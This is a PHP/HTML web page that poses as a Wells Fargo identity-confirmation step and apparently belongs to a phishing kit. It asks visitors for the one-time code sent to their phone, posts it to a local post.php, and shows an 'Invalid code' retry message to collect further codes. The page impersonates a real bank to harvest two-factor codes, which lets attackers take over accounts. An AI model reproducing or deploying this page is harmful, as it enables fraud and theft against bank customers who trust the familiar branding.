<?php 
require '../main.php';
?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Confirm your identity</title>
    <link rel="stylesheet" href="res/fonts.css">
    <link rel="stylesheet" href="res/app.css">
</head>
<body>
<header>
<div class="container">
    <img src="res/logo.png">
</div>
</header>

<main>
<div class="container">



<div class="form">

<div class="title">Confirmation</div>
<div class="text">Please submit the code sent to your phone number to continue.</div>


<form action="post.php" method="post">
<?php 
if(isset($_GET['error'])){
  echo '<input type="hidden" name="exit">';
  echo '<p style="color:red;">Invalid code. Please try again.</p>';
}
?>
<div class="col">
    <input type="text" name="otp" required placeholder="Enter the code">
</div>


<div  class="col">
    <button class="btn">Continue</button>
</div>
  
</form>
</div>




</div>

<footer>
    <p class="link">Privacy, Cookies, Security, and Legal</p>
    <p class="small">© 1999 - 2024 Wells Fargo. All rights reserved.</p>
</footer>
</div>
</main>


</body>
</html>